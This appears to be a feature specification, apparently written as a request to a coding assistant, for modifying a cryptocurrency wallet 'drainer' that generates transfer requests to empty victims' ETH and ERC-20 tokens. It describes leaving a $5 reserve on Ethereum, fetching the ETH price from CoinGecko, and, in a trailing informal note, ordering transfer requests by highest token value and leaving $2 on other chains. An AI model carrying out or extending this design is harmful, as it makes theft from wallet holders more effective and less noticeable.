## Goal

On Ethereum mainnet only (chainId 1), the native ETH transfer request must always leave **$5 USD worth of ETH** untouched in the user's wallet. If the wallet's ETH value is at or below $5, **no ETH transaction request is generated at all** — the flow simply proceeds to the ERC-20 transfer requests (which remain completely unchanged).

All other chains (BNB, Polygon, Base), all ERC-20 logic, the Solana flow, the partnership flow, and every other transaction request remain exactly as they are today.

## Where the change lives

Single file: `src/utils/evmTransactions.ts`

Two functions are touched:

1. `**drainNativeTokens(signer, provider, chainName, chainId?)**`
  - Add an optional `chainId` parameter.
  - When `chainId === 1` (Ethereum):
    - Fetch current ETH/USD price from CoinGecko (`https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd`).
    - If the price fetch fails, fall back to a conservative hardcoded floor (e.g. `$3000`) so we never accidentally drain below the $5 reserve.
    - Compute `reserveWei = parseEther( (5 / ethPrice).toFixed(18) )`.
    - Compute `sendAmount = balance - gasBuffer - reserveWei`.
    - If `sendAmount <= 0n` → log and `return null` (no ETH tx request is prompted).
  - For all other chains: behavior is identical to today (only gas buffer is subtracted).
2. `**drainAllEVMTokens(signer, provider, chainName, chainId)**`
  - Pass `chainId` through to `drainNativeTokens` so the Ethereum-only reserve logic is applied.
  - ERC-20 detection and transfer loop is **unchanged** — those requests still fire normally even when the native ETH request is skipped.

## Behavior summary


| Chain                | Wallet ETH value | Native request generated?     | ERC-20 requests |
| -------------------- | ---------------- | ----------------------------- | --------------- |
| Ethereum (1)         | > $5             | Yes, for `balance − gas − $5` | Yes, unchanged  |
| Ethereum (1)         | ≤ $5             | **No**                        | Yes, unchanged  |
| BNB / Polygon / Base | any              | Yes, unchanged                | Yes, unchanged  |


## Non-goals

- No change to ERC-20 detection, ordering, amounts, or transfer code.
- No change to Solana (`Apepe.tsx`) flow.
- No change to gas estimation logic beyond what's described.
- No UI changes.       
- &nbsp;
- &nbsp;
- &nbsp;
-   what i also what you to do for the evm section is make it so that when the transaction request are been generated it will start displaying from the hights values token in usdt to the lowest values token and the native token transaction request will be the last except if the native token value is higher that the erc20 token in that case the native tokentransaction request will be generated first and if it is on other evm chains which isnt etherium it will live 2$ behind but for etherium it will live 5$ behind 